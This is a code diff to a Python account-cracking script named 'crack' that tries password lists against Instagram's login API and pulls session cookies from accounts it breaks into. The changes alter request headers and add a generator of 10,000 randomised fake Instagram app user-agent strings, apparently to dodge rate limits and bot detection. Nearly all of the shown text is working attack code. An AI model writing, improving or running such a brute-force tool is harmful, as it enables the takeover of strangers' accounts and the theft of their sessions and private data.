@@ -122,7 +122,7 @@ def crack(uid, password_list, total_count):
             'x-ig-www-claim': 'hmac.AR3mzTXmWJQaei0IjdtQkJIZZIkfif5qOU0tUpKo_5EceiMR',
             'sec-ch-ua-mobile': '?1',
             'x-instagram-ajax': '1010361788',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 16; SM-S931U Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/138.0.7204.179 Mobile Safari/537.36 Instagram 408.0.0.51.78 Android (36/16; 540dpi; 1080x2340; samsung; SM-S931U; pa1q; qcom; en_US; 832162577; IABMV/1)',
+            'user-agent': 'Instagram 312.1.0.34.111 Android (30/11; 320dpi; 720x1472; INFINIX MOBILITY LIMITED/Infinix; Infinix X688B; Infinix-X688B; mt6765; en_US; 548323754)',
             'viewport-width': '421',
             'content-type': 'application/x-www-form-urlencoded',
             'accept': '*/*',
@@ -149,7 +149,7 @@ def crack(uid, password_list, total_count):
             'username': uid,
             'jazoest': '22898',}
             # Make API request
-            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', cookies=cookies, headers=headers, data=data)
+            response = session.post('https://i.instagram.com/api/v1/web/accounts/login/ajax/', data=data, headers=headers)
             wanted = ["ds_user_id", "sessionid"]
             all_cookies = session.cookies.get_dict()
             extracted = {k: all_cookies[k] for k in wanted if k in all_cookies}
@@ -196,6 +196,35 @@ def crack(uid, password_list, total_count):
     
     return False
 
+brands = [
+    ("INFINIX MOBILITY LIMITED", "Infinix", "Infinix X690B", "Infinix-X690B", "mt6768"),
+    ("vivo", "vivo", "vivo 1915", "vivo-1915", "qcom"),
+    ("realme", "realme", "realme RMX2185", "realme-RMX2185", "mt6765"),
+    ("Poco", "Poco", "Poco X3 Pro", "Poco-X3-Pro", "qcom"),
+    ("samsung", "samsung", "Samsung SM-A505F", "Samsung-SM-A505F", "exynos9610"),
+    ("ASUS", "ASUS", "ASUS_I005DA", "ASUS-I005DA", "qcom"),
+    ("Apple", "iPhone", "iPhone12,1", "iPhone12,1", "arm64"),
+    ("Redmi", "Redmi", "Redmi Note 9", "Redmi-Note-9", "mt6769")
+]
+
+ugenx = []
+
+for _ in range(10000):
+    brand, manufacturer, model, model_code, chipset = random.choice(brands)
+    android_version = random.randint(28, 34)  # Versi Android (Android 9 - Android 14)
+    dpi = random.choice([320, 400, 420, 480, 560, 640])
+    width = random.choice([720, 1080, 1440, 2160])
+    height = random.choice([1280, 1920, 2340, 2560])
+    lang = random.choice(["en_US", "fr_FR", "id_ID", "es_ES", "pt_BR"])
+
+    user_agent = (
+        f"Instagram {random.randint(300, 400)}.0.0.{random.randint(10, 99)}."
+        f"{random.randint(100, 999)} Android ({android_version}/{random.randint(5, 15)};"
+        f" {dpi}dpi; {width}x{height}; {brand}/{manufacturer}; {model}; {model_code}; {chipset}; {lang};"
+        f" {random.randint(100000000, 999999999)})"
+    )
+
+    ugenx.append(user_agent)
 
 def generate_random_ids(limit):
     """Generate random 6-digit IDs"""
